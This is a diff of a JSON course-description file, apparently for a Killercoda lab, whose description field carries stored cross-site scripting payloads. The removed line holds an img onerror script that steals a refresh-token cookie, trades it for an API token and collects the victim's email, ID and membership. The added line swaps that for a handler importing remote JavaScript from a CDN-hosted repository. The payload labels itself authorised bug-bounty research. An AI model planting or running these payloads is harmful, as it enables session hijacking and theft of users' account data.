@@ -1,6 +1,6 @@
 {
   "title": "KC Sec Lab Course",
-  "description": "COURSE-DESC-START <img src=x onerror=\"if(location.hash!=='#kcpoc'){}else{(async()=>{var rt=(document.cookie.match(/jwt_refresh_token=([^;]+)/)||[])[1];var d={origin:location.origin,url:location.href.split('#')[0],refreshTokenReadableFromJS:!!rt,refreshTokenLength:rt?rt.length:0};if(rt){var r=await fetch('https://api.killercoda.com/auth/token/refresh',{method:'POST',headers:{'Content-Type':'application/ld+json'},body:JSON.stringify({refresh_token:rt})});var j=await r.json();if(j.token){d.gotFreshApiJwt=true;var u=await (await fetch('https://api.killercoda.com/users',{headers:{'Authorization':'Bearer '+j.token,'Accept':'application/ld+json'}})).json();var m=u['hydra:member'][0];d.victimEmail=m.email;d.victimUuid=m.uuid;d.victimMembership=m.membership.level;}}window.__KC_XSS=d;var b=document.createElement('div');b.id='kcxss';b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#b00020;color:#fff;font:13px/1.45 monospace;padding:12px;white-space:pre-wrap';b.textContent='STORED XSS PoC (authorised security research, killercoda.com bug bounty)\\n'+JSON.stringify(d,null,1);document.body.appendChild(b);})()}\"> COURSE-DESC-END",
+  "description": "COURSE-DESC-START <img src=x onerror=\"location.hash=='#kcpoc'&&import('//cdn.statically.io/gh/kcsec-lab-2026/kc-lab/main/poc.js')\"> COURSE-DESC-END",
   "items": [
     {
       "path": "s1"
